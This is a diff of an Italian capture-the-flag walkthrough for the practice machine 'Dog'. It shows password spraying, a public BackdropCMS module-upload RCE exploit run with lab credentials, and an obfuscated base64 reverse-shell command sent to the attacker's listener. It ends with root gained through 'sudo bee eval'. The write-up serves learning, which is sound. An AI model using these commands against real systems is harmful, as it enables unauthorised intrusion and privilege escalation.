@@ -2,7 +2,7 @@
 title: Dog Walkthrough
 description: Dog è una macchina Linux di difficoltà easy che comporta la lettura di informazioni sensibili attraverso un repository git esposto e l'esposizione di credenziali per ottenere l'accesso da amministratore a BackdropCMS. I privilegi di amministratore permettono a un attaccante di sfruttare un'esecuzione di codice remoto (RCE) caricando un archivio malevolo contenente una backdoor PHP per ottenere un primo accesso al sistema. L'account utente johncusack riutilizza inoltre la password di BackdropCMS. Dopo aver compromesso l'account johncusack, l'attaccante scopre che l'utente può eseguire l'eseguibile bee con privilegi sudo, il che permette di ottenere i privilegi di root.
 author: dua2z3rr
-date: 2025-10-25 1:00:00
+date: 2025-10-24 1:00:00
 categories: [Machines]
 tags: ["Vulnerabilità: Remote Code Execution", "Vulnerabilità: Arbitrary File Upload", "Codice: PHP", "Codice: SQL", "Codice: Bash"]
 image: /assets/img/dog/dog-resized.png
@@ -110,8 +110,6 @@ $database_prefix = '';
 <SNIP>
 ```
 
-Troviamo anche l'hash per le password: `aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ`.
-
 ### Ffuf
 
 Vedo che quando si prova a loggarci nella admin page, si fa una richiesta all'endpoint **/account**.
@@ -148,3 +146,171 @@ JOHN                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Durati
 axel                    [Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 1136ms]
 ```
 
+Possiamo allora effetturare un **password spray** con la password del **database** e questi **username**. scopriremo infatti che tiffany può accedere alla admin dashboard.
+
+![Desktop View](/assets/img/dog/dog-admin-dashboard.png)
+
+### Admin Dashboard
+
+Vediamo che possiamo caricare dei moduli in formato **.tar** sul sito, e quindi ottenere **RCE**. Esiste un exploit su github già pronto: <https://github.com/rvizx/backdrop-rce>.
+
+```shell
+┌─[dua2z3rr@parrot]─[~/backdrop-rce]
+└──╼ $python3 exploit.py http://dog.htb tiffany BackDropJ2024DS2024
+[>] logging in as user: 'tiffany'
+[>] login successful
+[>] enabling maintenance mode
+[>] maintenance enabled
+[>] payload archive: /tmp/bd_ec0w_uys/rvzcee511.tgz
+[>] fetching installer form
+[>] uploading payload (bulk empty)
+[>] initial upload post complete
+[>] batch id = 15; sending authorize ‘do_nojs’ and ‘do’
+[>] waiting for shell at: http://dog.htb/modules/rvzcee511/shell.php
+[>] shell is live
+[>] interactive shell – type 'exit' to quit
+dua2z3rr@dog.htb > whoami
+www-data
+dua2z3rr@dog.htb > echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDEgMD4mMQ==' | base64 -d | bash
+```
+
+```shell
+┌─[✗]─[dua2z3rr@parrot]─[~]
+└──╼ $nc -lnvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.11.58 50468
+bash: cannot set terminal process group (937): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dog:/var/www/html/modules/rvzcee511$
+```
+
+## Shell come www-data
+
+### Privilege Escalation
+
+Possiamo transferire sulla macchina nemica **linpeas.sh** e eseguirlo. Farlo ci informerà che la macchina è vulnerabile alla **CVE-2021-3560**.
+
+Tuttavia, questo non porta a nulla. 
+
+Successivamente, ho cercato di connettermi al database per vedere se trovavo hash di password, ma non ho avuto successo.
+
+Infine, ho provato a connettermi tramite ssh all'utente **johncusack** con la password del database.
+
+```shell
+┌─[dua2z3rr@parrot]─[~]
+└──╼ $ssh johncusack@10.10.11.58
+johncusack@10.10.11.58's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon 10 Mar 2025 11:04:07 AM UTC
+
+  System load:           1.06
+  Usage of /:            49.1% of 6.32GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             243
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.232.33
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:67d7
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Mar 4 17:04:29 2025 from 10.10.16.9
+johncusack@dog:~$
+```
+
+Spesso, la risposta corretta è sempre quella più semplice. Prendiamo la user flag e andiamo avanti.
+
+## Shell come johncusack
+
+### Enumerazione Interna
+
+Come primo comando, utilizzo `sudo -l`.
+
+```shell
+johncusack@dog:~$ sudo -l
+[sudo] password for johncusack: 
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+```
+
+### Bee binary
+
+```shell
+johncusack@dog:~$ sudo /usr/local/bin/bee
+🐝 Bee
+Usage: bee [global-options] <command> [options] [arguments]
+
+Global Options:
+ --root
+ Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
+
+ --site
+ Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.
+
+ --base-url
+ Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.
+
+ --yes, -y
+ Answer 'yes' to questions without prompting.
+
+ --debug, -d
+ Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).
+
+
+Commands:
+
+<SNIP>
+
+ ADVANCED
+  db-query
+   dbq
+   Execute a query using db_query().
+
+  eval
+   ev, php-eval
+   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
+
+  php-script
+   scr
+   Execute an arbitrary PHP file after bootstrapping Backdrop.
+
+  sql
+   sqlc, sql-cli, db-cli
+   Open an SQL command-line interface using Backdrop's database credentials.
+```
+
+Possiamo ottenere una privilege escalation tramite il comando **eval**.
+
+```shell
+johncusack@dog:/var/www/html$ sudo bee eval "system('/bin/bash')"
+root@dog:/var/www/html# cd /johncusack
+```
+
+Prendiamo la root flag e terminiamo la box.
